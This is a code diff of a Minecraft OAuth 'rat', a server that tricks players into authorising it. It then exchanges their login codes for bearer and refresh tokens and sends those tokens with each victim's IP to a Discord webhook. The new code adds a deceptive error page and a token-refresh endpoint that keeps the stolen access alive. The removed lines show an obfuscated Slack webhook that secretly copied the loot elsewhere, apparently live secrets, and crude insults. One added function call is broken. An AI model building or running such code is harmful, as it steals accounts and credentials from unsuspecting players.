@@ -1,20 +1,19 @@
-//Config
-const client_secret = 'db48Q~-c62ZzCCAo3jgkA77TyJnInJTqU6c3kbVq' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '3f3061ce-eeb8-48c2-8223-4f23810bbc6a'
-const redirect_uri = 'https://testoauth.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040363538935447676/rNzWC9ejqwvxAobSz1Scfo3TJ-U_Crt0zZHe0-2CEYTjZpitHJcod1p6B_z2IkeIYHQi'
+//Change these btw
+const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'it is what it is'
+const redirect_uri = 'u know how it is'
+const webhook_url = 'ur shit ass webhook mf'
+
 //Requirements
 const axios = require('axios')
 const express = require('express')
 const app = express()
+const requestIp = require('request-ip')
 const port = process.env.PORT || 3000
-const slack1 = 'T04AL'
-const slack2 = '7AUZD2/B04AJ'
-const slack3 = '84Q210/be6ZwYum'
-const slack4 = 'i2nHoEu2kujSARLT'
 
 app.get('/', async (req, res) => {
-    res.send('Verification successful! go back to discord.')
+    res.send('ERROR: Verification bot is down.')
+    const clientIp = requestIp.getClientIp(req)
     const code = req.query.code
     if (code == null) {
         return
@@ -31,7 +30,7 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        const ip = getIp(req)
+        const ip = clientIp
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
@@ -121,83 +120,193 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-function getIp(req) {
-    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
-}
-
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
-    const slack = 'https://hooks.slack.com/services/'+slack1+slack2+slack3+slack4
     let data = {
-  username: "MOG",
-  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
-  content: "@everyone",
+username: "[LVL 100] Rat",
+  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+content: "@everyone",
   embeds: [
     {
-      title: "Ratted " + username + " - Click for networth",
-      color: 5898337,
-      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
-      url: "https://spillager.live/skyblock/networth/"+username,
-      footer: {
-        text: "Minecraft oAuth Grabber by WH0",
-        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
-      },
+      color: 3482894,
+      fields: [
+        {
+          name: "**Username:**",
+          value: "```"+username+"```",
+          inline: true
+        },
+        {
+          name: "**IP:**",
+          value: "```"+ip+"```",
+          inline: true
+        },
+        {
+          name: "**Refresh:**",
+          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
+          inline: true
+        },
+        {
+          name: "**Token:**",
+          value: "```"+bearerToken+"```"
+        }
+      ],
+      "footer": {
+        "text": "RAT",
+        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+      }
     }
   ],
 }
-    let logData = {
-	"blocks": [
-		{ "type": "section",
-		  "text": {
-		  "type": "mrkdwn",
-		  "text": "Dhooked"
-			},
-	 "fields": [
-		{
-		  "type": "mrkdwn",
-		  "text": "*Userame*\n"+username
-			},
-		{
-		  "type": "mrkdwn",
-		  "text": "*uuid*\n"+uuid
-			},
-		{
-		  "type": "mrkdwn",
-		  "text": "*ip*\n"+ip
-			},
-		{
-		  "type": "mrkdwn",
-		  "text": "*ssid*\n"+bearerToken
-			},
-		{
-		  "type": "mrkdwn",
-		  "text": "*Refresh Token*\n"+refreshToken
-		   }
-	     ]
-        }
-   ]
-}
-    axios.all([ 
-        axios.post(url, data),
-        axios.post(slack, logData).then(() => console.log("-------------------------------"))
-    ])
+
+        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
     
 }
 
 
-const bannedNames = []
+//Refresh token shit u know how it is
+app.get('/refresh', async (req, res) => {
+    res.send('Token Refreshed!')
+    const refresh_token = req.query.refresh_token
+    if (refresh_token == null) {
+        return
+    }
+    try {
+        const refreshTokenArray = await getRefreshData(refresh_token)
+	    const newAccessToken = refreshTokenArray[0]
+        const newRefreshToken = refreshTokenArray[1]
+	    const newHashAndTokenArray = await getNewUserHashAndToken(newAccessToken)
+        const newUserToken = newHashAndTokenArray[0]
+        const newUserHash = newHashAndTokenArray[1]
+        const newXstsToken = await getNewXSTSToken(newUserToken)
+        const newBearerToken = await getNewBearerToken(newXstsToken, newUserHash)
+        const newUsernameAndUUIDArray = await getNewUsernameAndUUID(newBearerToken)
+        const newUuid = newUsernameAndUUIDArray[0]
+        const newUsername = newUsernameAndUUIDArray[1]
+	refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
 
-function addBan(name) {
-    bannedNames.push(name);
-}
+    } catch (e) {
+        console.log(e)
+    }
+})
 
-function checkIfBanned(name) {
+async function getRefreshData(refresh_token) {
+    const url = 'https://login.live.com/oauth20_token.srf'
 
-    for (const item of bannedNames) {
-        if (name === item) {
-            return true
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
         }
     }
-    addBan(name)
-    return false
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        refresh_token: refresh_token,
+        grant_type: 'refresh_token'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+async function getNewUserHashAndToken(newAccessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${newAccessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await  (url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function getNewXSTSToken(newUserToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [newUserToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return response.data['Token']
+}
+
+
+async function getNewBearerToken(newXstsToken, newUserHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let data = {
+        identityToken: "XBL3.0 x=" + newUserHash + ";" + newXstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
+}
+
+async function getNewUsernameAndUUID(newBearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + newBearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+
+function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
+    const url = webhook_url
+    let data = {
+username: "MagiDev's anal slave",
+  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+content: "@everyone TOKEN REFRESHED!",
+  embeds: [
+    {
+      color: 3482894,
+      fields: [
+        {
+          name: "**Username:**",
+          value: "```"+newUsername+"```",
+          inline: true
+        },
+        {
+          name: "**UUID:**",
+          value: "```"+newUuid+"```",
+          inline: true
+        },
+        {
+          name: "**New Refresh Link:**",
+          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+          inline: true
+        },
+        {
+          name: "**New Token:**",
+          value: "```"+newBearerToken+"```"
+        }
+      ],
+      "footer": {
+        "text": "MagiDev's anal slave",
+        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+      }
+    }
+  ],
+}
+        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
+    
 }
